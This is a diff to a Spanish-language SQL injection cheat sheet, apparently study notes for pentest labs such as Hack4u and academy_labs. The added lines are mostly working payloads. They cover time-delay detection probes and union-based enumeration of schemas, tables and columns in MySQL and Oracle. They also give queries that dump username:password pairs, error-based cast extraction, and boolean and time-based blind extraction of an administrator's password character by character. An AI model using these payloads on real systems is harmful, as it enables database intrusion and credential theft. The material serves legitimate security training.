@@ -4,11 +4,18 @@
 
 ---
 ---
-#### **¿Qué es SQL Injection?**  
-La **inyección SQL (SQLi)** es una vulnerabilidad que permite al atacante manipular consultas SQL realizadas por la aplicación para acceder o modificar datos de la base de datos.  
-El atacante puede enviar consultas maliciosas a través de parámetros de entrada, explotando así la aplicación vulnerable.  
+## **Deteccion**  
+
+```sql
+'
+"
+' or sleep(5)--
+'||pg_sleep(5)--
+'; waitfor delay '0:0:5'--
+```
 
 ---
+# **SQLi**  
 
 ## **Fase 1: Descubrimiento de Columnas con `ORDER BY`**  
 
@@ -52,7 +59,7 @@ id=32' union select schema_name from information_schema.schemata-- -
 - **`schema_name`:** Columna que contiene los nombres de las bases de datos.  
 - **`information_schema`:** Esquema especial que almacena metadatos.  
 - **`schemata`:** Tabla que contiene los nombres de las bases de datos.  
-
+**Oracle**
 ---
 
 ## **Concatenación con `group_concat()`**  
@@ -70,23 +77,33 @@ id=32' union select schema_name from information_schema.schemata limit 0,1-- -
 ## **Fase 4: Enumeración de Tablas**  
 
 Para listar todas las tablas dentro de una base de datos:  
+**MySQL**
 ```sql
 id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
 ```
+**Oracle**
+```sql
+id=32' union select NULL,table_name from all_tables-- -
+```
+
 
 ---
 
 ## **Fase 5: Enumeración de Columnas**  
 
 Para listar todas las columnas dentro de una tabla específica:  
+**MySQL**
 ```sql
 id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
 ```
-
+**Oracle**
+```sql
+id=32' union select NULL,column_name from all_tab_columns where table_name='table'-- -
+```
 ---
 
 ## **Fase 6: Extracción de Datos**  
-
+**MySQL**
 Obtener los usuarios almacenados:  
 ```sql
 id=32' union select group_concat(username) from users-- -
@@ -95,32 +112,63 @@ id=32' union select group_concat(username) from users-- -
 Obtener usuarios y contraseñas en conjunto:  
 ```sql
 id=32' union select group_concat(username,':',password) from users-- -
-id=32' union select NULL,group_concat(category,0x3a,name) from academy_labs.products-- 
+id=32' union select NULL,group_concat(username,0x3a,password) from users-- 
+id=32' union select NULL,concat(username,0x3a,password) from users-- 
+id=32' union select NULL,username||':'||password from users-- 2
 ```
 
----
+Obtener usuarios y contraseñas aprovechando errores:
+*Probar siempre tambien borrando la data que habia antes*
+```sql
+id=32' or 1=cast((select 1) as INT)-- -
+id=' or 1=cast((select password from users limit 1) as INT)-- -
+```
 
-## **Aclaraciones Importantes**  
+**Oracle**
+```mysql
+id=32' union select username,password from users-- -
+```
 
-- **ORDER BY:** El número representa el total de columnas. Ejemplo:  
-  ```sql
-  id=1' order by 2-- -
-  ```
-- **UNION SELECT:** El número de columnas en el `SELECT` debe coincidir con la consulta original. Ejemplo:  
-  ```sql
-  id=1' union select 1,2-- -
-  ```
-- **Para verificar cuál columna refleja el valor, prueba con valores no válidos:**  
-  ```sql
-  id=-1' union select 1,2-- -
-  ```
-  - Una vez identificada la columna que refleja el resultado, inyecta comandos en esa posición:  
-    ```sql
-    id=-1' union select database(),2-- -
-    ```
 
 ---
+## **BSQLi**
+## **Enumeracion basada en nested queries**
 
+### MySQL
+**Enumeracion de contraeñas**
+```sql
+id=32' and (select substring(password,1,1) from users where username='administrator')='a'-- -
+```
+
+**Enumeracion de longitud de contraseña**
+```sql
+id=32' and (select 'a' from users where username='administrator' and length(password)>10)='a'-- -
+```
+
+### Oracle
+**Enumeracion de contraeñas**
+```sql
+id=32'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
+```
+
+**Enumeracion de longitud de contraseña**
+```sql
+id=32'||(select case when length(password)>20 then to_char(1/0) else '' end from users where username='administrator')||'
+```
+
+## Enumeracion basada en retrasos de tiempo
+
+### PostgreSQL
+**Enumeracion de longitud de contraseña**
+```sql
+id=32'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- 
+```
+
+**Enumeracion de contraeñas**
+```sql
+id=32'%3b select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- 
+```
+---
 ## **Automatización con SQLMap**  
 
 ### **Enumeración de Bases de Datos:**
